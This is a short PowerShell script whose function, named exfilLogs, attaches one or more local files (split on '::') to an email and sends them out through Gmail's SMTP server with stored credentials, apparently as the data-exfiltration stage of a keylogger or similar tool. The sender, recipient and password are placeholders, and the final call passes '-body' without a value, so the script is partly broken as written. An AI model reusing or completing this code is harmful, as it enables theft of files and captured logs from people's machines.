Param( [String]$attachment, [String]$subject, [String] $body)

#Below is a declaration for the function that will handle sending email to gmail's smtp server

Function exfilLogs
{
    #The function will accept the following parameters all of which are mandatory

    Param(  [Parameter(Mandatory = $true)] [String] $recepient,
            [Parameter(Mandatory = $true)] [String] $sender,
            [Parameter(Mandatory = $true)] [String] $password,
            [Parameter(Mandatory = $true)] [String] $subject,
            [Parameter(Mandatory = $true)] [String] $body,
            [Parameter(Mandatory = $true)] [String] $attachment)

    #This try-catch block will attempt to send the email after building the groundwork for our message

    try
    {
        #We declare a message variable w/ relevant values and assign our smtp server

        $message = New-Object System.Net.Mail.MailMessage($sender, $recepient, $subject, $body);
        $mailServer = "smtp.gmail.com";

        #If the attachment is not equal to null

        if($attachment -ne $null)
        {
            try
            {
                #Split multiple files into individual attachments

                $workingAttachment = $attachment -split ("\:\:");

                #Loop through them and add them to the main message object

                ForEach($value in $workingAttachment)
                {
                    $workingAttachment2 = New-Object System.Net.Mail.Attachment($value);
                    
                    $message.Attachments.Add($workingAttachment2);
                }
            }
            catch
            {
                exit 2;
            }

            #Now that we have constructed a message with an attachement, we continue by connecting our mail client to our mail server
            #Then enable security (mandatory), create credentials with our username and password, and finally send our message off

            $mailClient = New-Object System.Net.Mail.SmtpClient($mailServer, 587);
            $mailClient.EnableSsl = $true;
            $mailClient.Credentials = New-Object System.Net.NetworkCredential($sender.Split("@")[0], $password);
            $mailClient.Send($message);
            
            #Finally we destroy the client as well as our credential

            Remove-Variable -name mailClient;
            Remove-Variable -name password;

            exit 7;

        }
    }
    catch
    {
        exit 3;
    }
}

try
{
    exfilLogs -sender "temp@mail.com" -recepient "temp@mail.com" -subject $subject -body -attachment $attachment -password "blah";
}
catch
{
    exit 4;
}